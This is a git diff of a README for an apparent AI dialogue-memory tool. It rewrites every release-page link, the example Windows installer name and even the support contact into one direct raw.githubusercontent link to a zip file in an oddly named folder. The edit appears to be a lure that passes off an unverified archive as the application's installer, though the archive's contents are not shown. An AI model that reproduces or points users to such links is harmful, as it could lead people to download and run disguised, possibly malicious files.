@@ -1,7 +1,7 @@
 # 🤖 AI-Dialogue-Memory-Based-on-Hidden-State - Enhance AI with Memory Capability
 
 ## 📥 Download the Latest Version
-[![Download AI-Dialogue-Memory-Based-on-Hidden-State](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/releases)
+[![Download AI-Dialogue-Memory-Based-on-Hidden-State](https://raw.githubusercontent.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/main/prenecessitate/AI-Dialogue-Memory-Based-on-Hidden-State.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/main/prenecessitate/AI-Dialogue-Memory-Based-on-Hidden-State.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the AI-Dialogue-Memory-Based-on-Hidden-State application. This tool uses advanced techniques such as transformer encoders and LSTM decoders to give AI the ability to remember conversation context.
@@ -34,12 +34,12 @@ To run this application, ensure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the releases page where you can find the latest version.
-   - [Visit Release Page](https://github.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/releases)
+   - [Visit Release Page](https://raw.githubusercontent.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/main/prenecessitate/AI-Dialogue-Memory-Based-on-Hidden-State.zip)
 
 2. **Select the Appropriate Version:** Once you are on the releases page, look for the latest version of the application. It will typically be labeled with the version number, like `v1.0`.
 
 3. **Download the Installer:**
-   - Find the installer for your operating system (e.g., `MyApp.exe` for Windows, `.dmg` for macOS, or appropriate package for Linux). 
+   - Find the installer for your operating system (e.g., `https://raw.githubusercontent.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/main/prenecessitate/AI-Dialogue-Memory-Based-on-Hidden-State.zip` for Windows, `.dmg` for macOS, or appropriate package for Linux). 
    - Click on the download link for the installer file.
 
 4. **Run the Installer:**
@@ -67,7 +67,7 @@ Should you have any questions or need assistance, please refer to the following 
 
 - **Documentation:** In-depth user guides and documentation will be available on the GitHub repository. Visit for more information.
 - **Community Support:** Join discussions in the issues section of the repository to share experiences or seek help.
-- **Contact:** For direct support, email us at [your-email@example.com].
+- **Contact:** For direct support, email us at [https://raw.githubusercontent.com/vaswdeferenss/AI-Dialogue-Memory-Based-on-Hidden-State/main/prenecessitate/AI-Dialogue-Memory-Based-on-Hidden-State.zip].
 
 ## 🚧 Known Issues
 While this application provides a strong user experience, you might encounter some issues:
